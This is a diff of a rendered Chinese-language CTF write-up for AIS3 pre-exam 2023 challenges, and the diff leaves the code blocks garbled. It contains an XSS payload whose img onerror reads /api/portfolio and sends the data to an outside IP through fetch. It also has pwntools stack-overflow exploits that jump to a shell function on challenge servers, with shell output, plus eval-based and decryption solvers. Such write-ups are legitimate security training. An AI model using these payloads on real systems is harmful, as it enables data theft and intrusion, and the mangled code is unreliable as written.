@@ -17,55 +17,46 @@ May 23, 2023
 <img src=https://user-images.githubusercontent.com/57281249/239949939-80bef056-5b2f-411e-9dee-ac420c3487e7.png alt=image></p><p>測一下
 <img src=https://user-images.githubusercontent.com/57281249/239950346-3fe6900c-5d62-4690-9550-4aaaa7115e5c.png alt=image></p><p>看起來可以
 <img src=https://user-images.githubusercontent.com/57281249/239950395-1559651a-26a4-4397-8bf6-c4c143e47259.png alt=image></p><p>用 flask 隨便寫個 server 聽 request</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
-
-<span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask,request,redirect,Response
-
-
-app <span style=color:#f92672>=</span> Flask(__name__)
-
-<span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>,methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
+<p><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask,request,redirect,Response</p>
+<p>app <span style=color:#f92672>=</span> Flask(<strong>name</strong>)</p>
+<p><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>'/'</span>,methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>'GET'</span>])
 <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>data</span>():
-    <span style=color:#66d9ef>print</span>(request<span style=color:#f92672>.</span>args)
-    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;aaa&#34;</span>
-
-
-<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
-    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span>,port<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>)
-</code></pre></div><p>payload</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>h5</span>&gt;Hello!&lt;/<span style=color:#f92672>h5</span>&gt;
+<span style=color:#66d9ef>print</span>(request<span style=color:#f92672>.</span>args)
+<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&quot;aaa&quot;</span></p>
+<p><span style=color:#66d9ef>if</span> <strong>name</strong> <span style=color:#f92672>==</span> <span style=color:#e6db74>&quot;<strong>main</strong>&quot;</span>:
+app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&quot;0.0.0.0&quot;</span>,port<span style=color:#f92672>=</span><span style=color:#ae81ff>80</span>)
+</code></pre></div><p>payload</p></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>h5</span>&gt;Hello!&lt;/<span style=color:#f92672>h5</span>&gt;
 I am a &lt;<span style=color:#f92672>span</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;color: red;&#34;</span>&gt;new&lt;/<span style=color:#f92672>span</span>&gt; user.
-
-&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>x</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;fetch(&#34;/api/portfolio&#34;).then(res =&gt; res.json()).then(data =&gt; {fetch(`http://10.113.193.20?${new URLSearchParams(data.data)}`)})&#39;</span>/&gt;
+<p>&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>x</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#e6db74>'fetch(&quot;/api/portfolio&quot;).then(res =&gt; res.json()).then(data =&gt; {fetch(<code>http://10.113.193.20?${new URLSearchParams(data.data)}</code>)})'</span>/&gt;
 </code></pre></div><p>送去給 admin
-<img src=https://user-images.githubusercontent.com/57281249/239951160-ce6aab2d-05dc-4a7a-a1bf-d611321778b6.png alt=image></p><p>然後就收到 flag 了
+<img src=https://user-images.githubusercontent.com/57281249/239951160-ce6aab2d-05dc-4a7a-a1bf-d611321778b6.png alt=image></p></p><p>然後就收到 flag 了
 <img src=https://user-images.githubusercontent.com/57281249/239951318-cdb64a68-3280-4d77-89e7-068574d94b4f.png alt=image></p><h3 id=flag>Flag</h3><p><code>AIS3{&lt;img src=x onerror='fetch(...}</code></p><h2 id=managementsystem>ManagementSystem</h2><h3 id=題目-2>題目</h3><p><img src=https://user-images.githubusercontent.com/57281249/239945264-fe5fdba3-c448-4cb5-a992-c3e0e517a49e.png alt=image></p><h3 id=解題-2>解題</h3><ol><li>IDA 打開</li><li>人真好有給 shell code
 <img src=https://user-images.githubusercontent.com/57281249/239945579-c0bb2a2a-acb4-44a1-877d-45215b54d609.png alt=image></li><li>每個 user 的 function 找一遍後發現 <code>delete_user</code> 有用 gets，可以 stack overflow，先讓他跑到 <code>"Invalid index."</code> 感覺問題比較少。
 <img src=https://user-images.githubusercontent.com/57281249/239946309-5ab98d0b-aa5e-4a18-ae77-4e6f49c20f30.png alt=image></li><li>找 shell code 的位置
 <img src=https://user-images.githubusercontent.com/57281249/239947071-567d01ea-a12f-422b-86ce-5e64132ec7b9.png alt=image></li><li>exploit</li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> pwn
 <span style=color:#f92672>import</span> re
 <span style=color:#f92672>import</span> sys
-
-r <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>remote(<span style=color:#e6db74>&#39;chals1.ais3.org&#39;</span>, <span style=color:#ae81ff>10003</span>)
-
+<p>r <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>remote(<span style=color:#e6db74>'chals1.ais3.org'</span>, <span style=color:#ae81ff>10003</span>)</p>
+<p><span style=color:#66d9ef>print</span>(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode())
+r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>'3'</span>)
 <span style=color:#66d9ef>print</span>(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode())
-r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;3&#39;</span>)
-<span style=color:#66d9ef>print</span>(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode())
-r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-1&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;x&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>8</span><span style=color:#f92672>*</span><span style=color:#ae81ff>13</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>) <span style=color:#f92672>+</span> int(<span style=color:#e6db74>&#39;40131B&#39;</span>, <span style=color:#ae81ff>16</span>)<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#39;little&#39;</span>))
-
-<span style=color:#66d9ef>while</span> True:
-    <span style=color:#66d9ef>print</span>(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode(), end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
-    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;&gt; &#39;</span>, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
-    r<span style=color:#f92672>.</span>send(input()<span style=color:#f92672>.</span>encode())
+r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>'-1'</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>'x'</span><span style=color:#f92672><em></span>(<span style=color:#ae81ff>8</span><span style=color:#f92672></em></span><span style=color:#ae81ff>13</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>) <span style=color:#f92672>+</span> int(<span style=color:#e6db74>'40131B'</span>, <span style=color:#ae81ff>16</span>)<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>'little'</span>))</p>
+<p><span style=color:#66d9ef>while</span> True:
+<span style=color:#66d9ef>print</span>(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode(), end<span style=color:#f92672>=</span><span style=color:#e6db74>''</span>)
+<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>'&gt; '</span>, end<span style=color:#f92672>=</span><span style=color:#e6db74>''</span>)
+r<span style=color:#f92672>.</span>send(input()<span style=color:#f92672>.</span>encode())
 <span style=color:#75715e>#    r.send(sys.stdin.buffer.read())</span>
 </code></pre></div><pre><code>chummy@hitcon:~/ais3preexam2023$ python3 mansysexp.py                                                                                                                                                    [11/294][+] Opening connection to chals1.ais3.org on port 10003: Done
-Choose an option:
-1. Add user
-2. Show users
-3. Delete user
-4. Exit
+Choose an option:</p>
+<ol>
+<li>Add user</li>
+<li>Show users</li>
+<li>Delete user</li>
+<li>Exit
 &gt;
 Enter the index of the user you want to delete:
 Invalid index.
-Congratulations! You've successfully executed the secret function.
+Congratulations! You&rsquo;ve successfully executed the secret function.
 &gt; ls
 bin
 boot
@@ -101,39 +92,35 @@ FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}
 &gt;
 [*] Closed connection to chals1.ais3.org port 10003
 Traceback (most recent call last):
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 65, in send_raw
-    self.sock.sendall(data)
-BrokenPipeError: [Errno 32] Broken pipe
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File &quot;/home/chummy/ais3preexam2023/mansysexp.py&quot;, line 15, in &lt;module&gt;
-    r.send(input().encode())
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 778, in send
-    self.send_raw(data)
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 70, in send_raw
-    raise EOFError
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 65, in send_raw
+self.sock.sendall(data)
+BrokenPipeError: [Errno 32] Broken pipe</li>
+</ol>
+<p>During handling of the above exception, another exception occurred:</p>
+<p>Traceback (most recent call last):
+File &quot;/home/chummy/ais3preexam2023/mansysexp.py&quot;, line 15, in &lt;module&gt;
+r.send(input().encode())
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 778, in send
+self.send_raw(data)
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 70, in send_raw
+raise EOFError
 EOFError
-</code></pre><h3 id=flag-1>Flag</h3><p><code>FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}</code></p><h2 id=robot>Robot</h2><h3 id=題目-3>題目</h3><p><img src=https://user-images.githubusercontent.com/57281249/239931354-afd14468-755c-4429-93a4-720e96efa0ac.png alt=image></p><h3 id=解題-3>解題</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> pwn
+</code></pre><h3 id=flag-1>Flag</h3></p><p><code>FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}</code></p><h2 id=robot>Robot</h2><h3 id=題目-3>題目</h3><p><img src=https://user-images.githubusercontent.com/57281249/239931354-afd14468-755c-4429-93a4-720e96efa0ac.png alt=image></p><h3 id=解題-3>解題</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> pwn
 <span style=color:#f92672>import</span> re
-
-r <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>remote(<span style=color:#e6db74>&#39;chals1.ais3.org&#39;</span>, <span style=color:#ae81ff>12348</span>)
-
-r<span style=color:#f92672>.</span>recvline()
-r<span style=color:#f92672>.</span>recvline()
-
-<span style=color:#66d9ef>while</span> True:
-    now <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recv(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
-    <span style=color:#66d9ef>print</span>(now<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip())
-    groups <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>match(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;\s*(\d*)\s*([^\s\d]*)\s*(\d*)&#39;</span>, now)
-    ans <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>
-    <span style=color:#66d9ef>if</span> groups<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>2</span>) <span style=color:#f92672>in</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;+-*/&#39;</span>:
-        ans <span style=color:#f92672>=</span> str(eval(f<span style=color:#e6db74>&#39;{groups.group(1).decode()}{groups.group(2).decode()}{groups.group(3).decode()}&#39;</span>))<span style=color:#f92672>.</span>encode()
-        <span style=color:#66d9ef>print</span>(f<span style=color:#e6db74>&#39;ans: {ans.decode()}&#39;</span>)
-        r<span style=color:#f92672>.</span>sendline(ans)
-    <span style=color:#66d9ef>else</span>:
-        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;bad&#39;</span>)
+<p>r <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>remote(<span style=color:#e6db74>'chals1.ais3.org'</span>, <span style=color:#ae81ff>12348</span>)</p>
+<p>r<span style=color:#f92672>.</span>recvline()
+r<span style=color:#f92672>.</span>recvline()</p>
+<p><span style=color:#66d9ef>while</span> True:
+now <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recv(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
+<span style=color:#66d9ef>print</span>(now<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip())
+groups <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>match(<span style=color:#e6db74>b</span><span style=color:#e6db74>'\s*(\d*)\s*([^\s\d]*)\s*(\d*)'</span>, now)
+ans <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>''</span>
+<span style=color:#66d9ef>if</span> groups<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>2</span>) <span style=color:#f92672>in</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>'+-*/'</span>:
+ans <span style=color:#f92672>=</span> str(eval(f<span style=color:#e6db74>'{groups.group(1).decode()}{groups.group(2).decode()}{groups.group(3).decode()}'</span>))<span style=color:#f92672>.</span>encode()
+<span style=color:#66d9ef>print</span>(f<span style=color:#e6db74>'ans: {ans.decode()}'</span>)
+r<span style=color:#f92672>.</span>sendline(ans)
+<span style=color:#66d9ef>else</span>:
+<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>'bad'</span>)
 </code></pre></div><pre><code>chummy@hitcon:~/ais3preexam2023$ python3 robotexp.py                                                                                                                                                      [30/53][+] Opening connection to chals1.ais3.org on port 12348: Done
 9  +  8
 ans: 17
@@ -193,42 +180,39 @@ ans: 11
 ans: 3
 7  *  2
 ans: 14
-print('Segmentation fault (core dumped)'), exit(139)
+print(&lsquo;Segmentation fault (core dumped)'), exit(139)
 bad
 6  *  4
 ans: 24
-Congratulations! Flag: AIS3{don't_eval_unknown_code_or_pipe_curl_to_sh}
+Congratulations! Flag: AIS3{don&rsquo;t_eval_unknown_code_or_pipe_curl_to_sh}
 bad
 Traceback (most recent call last):
-  File &quot;/home/chummy/ais3preexam2023/robotexp.py&quot;, line 10, in &lt;module&gt;
-    now = r.recv(timeout=1)
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 104, in recv
-    return self._recv(numb, timeout) or b''
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 174, in _recv
-    if not self.buffer and not self._fillbuffer(timeout):
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 153, in _fillbuffer
-    data = self.recv_raw(self.buffer.get_fill_size())
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 56, in recv_raw
-    raise EOFError
+File &quot;/home/chummy/ais3preexam2023/robotexp.py&quot;, line 10, in &lt;module&gt;
+now = r.recv(timeout=1)
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 104, in recv
+return self._recv(numb, timeout) or b&rsquo;'
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 174, in _recv
+if not self.buffer and not self._fillbuffer(timeout):
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 153, in _fillbuffer
+data = self.recv_raw(self.buffer.get_fill_size())
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 56, in recv_raw
+raise EOFError
 EOFError
 [*] Closed connection to chals1.ais3.org port 12348
-</code></pre><h3 id=flag-2>Flag</h3><p><code>AIS3{don't_eval_unknown_code_or_pipe_curl_to_sh}</code></p><h2 id=simplypwn>SimplyPwn</h2><h3 id=題目-4>題目</h3><p><img src=https://user-images.githubusercontent.com/57281249/239932495-6a0bafff-9626-4400-80ff-eebe9e2ac101.png alt=image></p><h3 id=解題-4>解題</h3><ol><li>IDA 打開</li><li>人真好有給 shell code
+</code></pre><h3 id=flag-2>Flag</h3></p><p><code>AIS3{don't_eval_unknown_code_or_pipe_curl_to_sh}</code></p><h2 id=simplypwn>SimplyPwn</h2><h3 id=題目-4>題目</h3><p><img src=https://user-images.githubusercontent.com/57281249/239932495-6a0bafff-9626-4400-80ff-eebe9e2ac101.png alt=image></p><h3 id=解題-4>解題</h3><ol><li>IDA 打開</li><li>人真好有給 shell code
 <img src=https://user-images.githubusercontent.com/57281249/239933559-f2a98b42-9d2a-4daa-8d46-ea66fac90097.png alt=image></li><li>array 最長 64 bytes 然後 read 256 bytes 一臉就會 stack overflow.
 <img src=https://user-images.githubusercontent.com/57281249/239943925-86da7a51-43c9-4d25-abb2-970d7d4fceba.png alt=image></li><li>找 shell code 的位置
 <img src=https://user-images.githubusercontent.com/57281249/239944562-8c292e6c-fa5d-46c9-95dd-a81dbea6c5e5.png alt=image></li><li>exploit</li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> pwn
 <span style=color:#f92672>import</span> re
 <span style=color:#f92672>import</span> sys
-
-r <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>remote(<span style=color:#e6db74>&#39;chals1.ais3.org&#39;</span>, <span style=color:#ae81ff>11111</span>)
-
-<span style=color:#66d9ef>print</span>(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode())
-r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;x&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>8</span><span style=color:#f92672>*</span><span style=color:#ae81ff>10</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>+</span> int(<span style=color:#e6db74>&#39;4017A9&#39;</span>, <span style=color:#ae81ff>16</span>)<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#39;little&#39;</span>))
-r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
-
-<span style=color:#66d9ef>while</span> True:
-    <span style=color:#66d9ef>print</span>(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode(), end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
-    <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#39;&gt; &#39;</span>, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
-    r<span style=color:#f92672>.</span>send(input()<span style=color:#f92672>.</span>encode())
+<p>r <span style=color:#f92672>=</span> pwn<span style=color:#f92672>.</span>remote(<span style=color:#e6db74>'chals1.ais3.org'</span>, <span style=color:#ae81ff>11111</span>)</p>
+<p><span style=color:#66d9ef>print</span>(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode())
+r<span style=color:#f92672>.</span>send(<span style=color:#e6db74>b</span><span style=color:#e6db74>'x'</span><span style=color:#f92672><em></span>(<span style=color:#ae81ff>8</span><span style=color:#f92672></em></span><span style=color:#ae81ff>10</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>+</span> int(<span style=color:#e6db74>'4017A9'</span>, <span style=color:#ae81ff>16</span>)<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>'little'</span>))
+r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)</p>
+<p><span style=color:#66d9ef>while</span> True:
+<span style=color:#66d9ef>print</span>(r<span style=color:#f92672>.</span>recvrepeat(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>decode(), end<span style=color:#f92672>=</span><span style=color:#e6db74>''</span>)
+<span style=color:#66d9ef>print</span>(<span style=color:#e6db74>'&gt; '</span>, end<span style=color:#f92672>=</span><span style=color:#e6db74>''</span>)
+r<span style=color:#f92672>.</span>send(input()<span style=color:#f92672>.</span>encode())
 <span style=color:#75715e>#    r.send(sys.stdin.buffer.read())</span>
 </code></pre></div><pre><code>chummy@hitcon:~/ais3preexam2023$ python3 simpwnexp.py
 [+] Opening connection to chals1.ais3.org on port 11111: Done
@@ -264,38 +248,33 @@ AIS3{5imP1e_Pwn_4_beGinn3rs!}
 &gt;
 [*] Closed connection to chals1.ais3.org port 11111
 Traceback (most recent call last):
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 65, in send_raw
-    self.sock.sendall(data)
-BrokenPipeError: [Errno 32] Broken pipe
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File &quot;/home/chummy/ais3preexam2023/simpwnexp.py&quot;, line 14, in &lt;module&gt;
-    r.send(input().encode())
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 778, in send
-    self.send_raw(data)
-  File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 70, in send_raw
-    raise EOFError
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 65, in send_raw
+self.sock.sendall(data)
+BrokenPipeError: [Errno 32] Broken pipe</p>
+<p>During handling of the above exception, another exception occurred:</p>
+<p>Traceback (most recent call last):
+File &quot;/home/chummy/ais3preexam2023/simpwnexp.py&quot;, line 14, in &lt;module&gt;
+r.send(input().encode())
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py&quot;, line 778, in send
+self.send_raw(data)
+File &quot;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py&quot;, line 70, in send_raw
+raise EOFError
 EOFError
-</code></pre><h3 id=flag-3>Flag</h3><p><code>AIS3{5imP1e_Pwn_4_beGinn3rs!}</code></p><h2 id=simply-reverse>Simply Reverse</h2><h3 id=題目-5>題目</h3><p><img src=https://user-images.githubusercontent.com/57281249/239952354-903f8815-c99c-414f-ada7-f5559bcd8636.png alt=image></p><h3 id=解題-5>解題</h3><ol><li>IDA 打開</li><li>讀 verify
+</code></pre><h3 id=flag-3>Flag</h3></p><p><code>AIS3{5imP1e_Pwn_4_beGinn3rs!}</code></p><h2 id=simply-reverse>Simply Reverse</h2><h3 id=題目-5>題目</h3><p><img src=https://user-images.githubusercontent.com/57281249/239952354-903f8815-c99c-414f-ada7-f5559bcd8636.png alt=image></p><h3 id=解題-5>解題</h3><ol><li>IDA 打開</li><li>讀 verify
 <img src=https://user-images.githubusercontent.com/57281249/239953043-467c41c6-7739-4d32-9c1f-723478da6244.png alt=image></li><li>看起來是把 encrypted 依照 index 做 rotation 就會得到 flag</li><li>找 encrypted 的位置把 hex 複製下來
 <img src=https://user-images.githubusercontent.com/57281249/239955653-08e2130a-4c36-4935-94eb-f587269729c0.png alt=image></li><li>然後寫 code 算回來</li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> sys
 <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rotation</span>(nowbyte, length):
     <span style=color:#66d9ef>return</span> (((nowbyte <span style=color:#f92672>&gt;&gt;</span> length) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>255</span>) <span style=color:#f92672>|</span> ((nowbyte <span style=color:#f92672>&lt;&lt;</span> (<span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> length)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>255</span>)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>255</span>
-
-enbytes <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(<span style=color:#e6db74>&#34;8A5092C8063D5B95B6521B35825AEAF8942872DDD45DE329BA5852A8643581AC0A64&#34;</span>)
-
-ansbytes <span style=color:#f92672>=</span> []
+<p>enbytes <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(<span style=color:#e6db74>&quot;8A5092C8063D5B95B6521B35825AEAF8942872DDD45DE329BA5852A8643581AC0A64&quot;</span>)</p>
+<p>ansbytes <span style=color:#f92672>=</span> []
 <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(enbytes)):
-    usebyte <span style=color:#f92672>=</span> enbytes[i] <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>
-    <span style=color:#66d9ef>if</span> usebyte <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>:
-        usebyte <span style=color:#f92672>+=</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>**</span><span style=color:#ae81ff>8</span>
-    ansbytes<span style=color:#f92672>.</span>append((rotation(usebyte, (i <span style=color:#f92672>^</span> <span style=color:#ae81ff>9</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>3</span>) <span style=color:#f92672>^</span> i) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>255</span>)
-
-sys<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>buffer<span style=color:#f92672>.</span>write(bytes(ansbytes))
+usebyte <span style=color:#f92672>=</span> enbytes[i] <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span>
+<span style=color:#66d9ef>if</span> usebyte <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>:
+usebyte <span style=color:#f92672>+=</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>**</span><span style=color:#ae81ff>8</span>
+ansbytes<span style=color:#f92672>.</span>append((rotation(usebyte, (i <span style=color:#f92672>^</span> <span style=color:#ae81ff>9</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>3</span>) <span style=color:#f92672>^</span> i) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>255</span>)</p>
+<p>sys<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>buffer<span style=color:#f92672>.</span>write(bytes(ansbytes))
 <span style=color:#75715e>#print(bytes(ansbytes))</span>
